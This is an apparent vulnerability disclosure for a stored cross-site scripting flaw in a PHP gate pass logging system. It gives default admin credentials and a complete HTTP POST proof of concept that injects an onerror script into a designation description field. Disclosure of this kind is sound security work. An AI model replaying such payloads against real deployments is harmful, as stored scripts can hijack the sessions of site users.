XSS vulnerability exists in Employee and Visitor Gate Pass Logging System

official website:https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

version:v1.0

route：/employee_gatepass/classes/Master.php?f=save_designation

related code file：Master.php

related_function：save_designation()

Influence parameters：$description

#### 1.Vulnerability verification and exploit

We need log in to the system backend as admin/admin123.The exploit proof-of-concept (PoC) for this vulnerability is as follows. When using it, you need to modify the relevant address information in the PoC according to the target environment, such as the host and refer fields.

```
POST /employee_gatepass/classes/Master.php?f=save_designation HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------120228256038204359792201197731
Content-Length: 572
Origin: http://localhost
Connection: close
Referer: http://localhost/employee_gatepass/admin/?page=maintenance/designation
Cookie: PHPSESSID=4qlrosbs5in77v9a3o1t5174c1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------120228256038204359792201197731
Content-Disposition: form-data; name="id"

9
-----------------------------120228256038204359792201197731
Content-Disposition: form-data; name="name"

Graphic Designer
-----------------------------120228256038204359792201197731
Content-Disposition: form-data; name="description"

Graphic Designer<img src=1 onerror=alert(1)>
-----------------------------120228256038204359792201197731
Content-Disposition: form-data; name="status"

1
-----------------------------120228256038204359792201197731--

```

After successfully executing the PoC, you can observe that the malicious pop-up has occurred on the Home page accessible to regular users, indicating a successful XSS attack.

<img width="1709" alt="image" src="https://github.com/Xu-Mingming/cve/assets/172484755/787b17b8-f6e0-40e8-b98f-f122d3155b13">

